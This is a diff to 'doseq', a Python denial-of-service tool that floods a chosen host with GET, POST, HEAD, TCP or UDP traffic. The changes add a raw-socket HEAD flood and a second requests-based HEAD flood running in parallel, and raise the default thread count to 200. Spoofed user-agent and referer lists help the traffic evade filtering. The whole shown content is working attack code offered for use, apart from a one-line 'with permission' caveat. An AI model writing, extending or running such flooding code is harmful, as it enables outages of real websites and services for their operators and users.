@@ -20,6 +20,7 @@ doseq = __file__
 __version__ = '1.0.0'
 i = 1
 attacks = ["get","post","head","tcp","udp"]
+
 headers_useragents = list()
 headers_useragents.append("Mozilla/5.0 (Linux; Android 9; JKM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Mobile Safari/537.36")
 headers_useragents.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
@@ -3214,6 +3215,7 @@ headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV
 headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHqTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
 headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
 headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
+
 headers_referers = list()
 headers_referers.append('http://www.google.com/?q=')
 headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
@@ -3411,7 +3413,7 @@ def post_attack():
                s.connect((target,port))
                s.send(post_packet)
                s.send(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890").encode('ascii'))
-               s.shutdown(1)
+               s.close()
                lock.acquire()
                i+=1
                lock.release()
@@ -3420,6 +3422,31 @@ def post_attack():
                time.sleep(delay)
         except (socket.error, BrokenPipeError, Exception, BaseException) as err:
             print("["+yl+"!"+wi+"] "+yl+"POST-ATTACK:"+wi+" Unable To Connect to Target ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
+            if isKilled():break
+            if hasattr(err, 'errno'):
+                if err.errno ==24:break
+            continue
+        if isKilled():break
+
+
+def head_attack():
+    global i
+    while True:
+        try:
+            head_packet = f"HEAD / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(headers_useragents)}\r\nAccept: text/html\r\n\r\n".encode("ascii")
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
+            s.connect((target,port))
+            s.send(head_packet)
+            s.close()
+            lock.acquire()
+            i+=1
+            lock.release()
+            print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+"]", end='\r')
+            if isKilled():break
+            time.sleep(delay)
+        except (socket.error, BrokenPipeError, Exception, BaseException) as err:
+            print("["+yl+"!"+wi+"] "+yl+"HEAD-ATTACK:"+wi+" Unable To Connect to Target ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
             if isKilled():break
             if hasattr(err, 'errno'):
                 if err.errno ==24:break
@@ -3467,11 +3494,11 @@ def request_post_attack():
         if isKilled():break
 
 
-def head_attack():
+def request_head_attack():
     global i
     while True:
         try:
-            req = requests.head(url, headers={'User-Agent': random.choice(headers_useragents),'Content-Type': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Referer": random.choice(headers_referers)}, timeout=5)
+            req = requests.head(url, headers={'User-Agent': random.choice(headers_useragents), "Accept": 'text/html'}, timeout=5)
             lock.acquire()
             i+=1
             lock.release()
@@ -3479,12 +3506,13 @@ def head_attack():
             if isKilled():break
             time.sleep(delay)
         except (Exception,BaseException) as err:
-            print("["+yl+"!"+wi+"] "+yl+"HEAD-ATTACK:"+wi+" Unable To Connect to Target ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
+            print("["+yl+"!"+wi+"] "+yl+"REQUEST-HEAD-ATTACK:"+wi+" Unable To Connect to Target ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
             if isKilled():break
             if hasattr(err, 'errno'):
                 if err.errno == 24: break
             continue
         if isKilled():break
+
 
 def cnet(server='www.google.com', port=80) -> bool:
    try:
@@ -3493,6 +3521,7 @@ def cnet(server='www.google.com', port=80) -> bool:
       return True
    except socket.error:pass
    return False
+
 
 def quit(sig,fream):
     print(rd+"\n["+yl+"!"+rd+"]"+yl+" User requested shutdown. "+rd+"..."+wi)
@@ -3505,6 +3534,7 @@ def quit(sig,fream):
     if started:
         print("["+gr+"*"+wi+"] I Hope You Used It With Permission"+yl+"!?"+wi)
     sys.exit(0)
+
 
 def update_doseq():
     if not cnet("raw.githubusercontent.com",80):
@@ -3544,6 +3574,7 @@ banner = """\033[1;31m
             [---]   by:>\033[1;32m Oseid Aldary\033[1;37m   [---]\033[1;32m
             =-------=-=-=-=-=-=-=-=-=-------=
 """
+
 started = False
 signal.signal(signal.SIGINT, quit)
 signal.signal(signal.SIGTERM,quit)
@@ -3558,7 +3589,7 @@ OPTIONS:
     |--------
     | -p/--port     <target_port>                             ::> Specify target port number Default(80) (Optional)
     |--------
-    | -t/--threads  <threads_number>                          ::> Specify number of threads Default(135) (Optional)
+    | -t/--threads  <threads_number>                          ::> Specify number of threads Default(200) (Optional)
     |--------
     | -a/--attack   <attack_type_(GET,POST,HEAD,TCP,UDP)>     ::> Specify attack type to be used  Default(random) (Optional)
     |--------
@@ -3578,12 +3609,14 @@ Examples:
      | python3 doseq.py --update
 
 ''', add_help_option = False, version='Doseq version 1.0')
+
 parse.add_option('-s', '--server', '--target', type=str, dest='target')
 parse.add_option('-p', '--port', type=str, dest='port')
 parse.add_option('-t', '--threads', type=str, dest='threads')
 parse.add_option('-a', '--attack', type=str, dest='attack')
 parse.add_option('-d', '--delay', type=str, dest='delay')
 parse.add_option('-u', '--update', action='store_true', dest='update', default=False)
+
 (options,args) = parse.parse_args()
 target = options.target
 port = options.port
@@ -3592,6 +3625,7 @@ attack = options.attack
 delay = options.delay
 update =  options.update
 opts = [target,port,threads,attack,delay,update]
+
 if  target:
         if not port:
             port = 80
@@ -3601,7 +3635,7 @@ if  target:
                 sys.exit(1)
             port = int(port)
         if not threads:
-            threads = 135
+            threads = 200
         else:
             if not threads.isdigit() or int(threads) <= 0:
                 print(rd+"["+yl+"!"+rd+"]"+yl+" Error: Invalid Threads Number Selected"+rd+" !!!"+wi)
@@ -3639,6 +3673,7 @@ if target.startswith(("https://", "http://")):
 else:
     url = "http://"+target + "/"
 target = urlparse(url).netloc
+
 print(wi + "[" + yl + "~" + wi + f"] Check The Connection To The Target " + gr + f"{target}" + wi + ":" + rd + f"{port}" + wi + " [...]", end='\r')
 time.sleep(2)
 if not cnet(target,port):
@@ -3662,7 +3697,7 @@ print("["+yl+"I"+wi+"]  Attacking Using[ "+yl+attack.upper()+wi+" ] On Target...
 print("["+yl+"I"+wi+"] Press "+gr+"' Ctrl+C ' "+wi+"To Stop The Attack")
 time.sleep(1.5)
 
-threads = ((threads // 2) if not (threads % 2) else (threads + 1) // 2) if attack in ['get','post'] else threads
+threads = ((threads // 2) if not (threads % 2) else (threads + 1) // 2) if not attack.startswith(('tcp','udp')) else threads
 started = True
 
 for _ in range(threads):
@@ -3689,11 +3724,16 @@ for _ in range(threads):
            t5.daemon = True
            t5.start()
            THREADS.append(t5)
-    else:
-           t6 = threading.Thread(target=sock_flood)
+           t6 = threading.Thread(target=request_head_attack)
            t6.daemon = True
            t6.start()
            THREADS.append(t6)
+
+    else:
+           t7 = threading.Thread(target=sock_flood)
+           t7.daemon = True
+           t7.start()
+           THREADS.append(t7)
 
     if isKilled():break
 
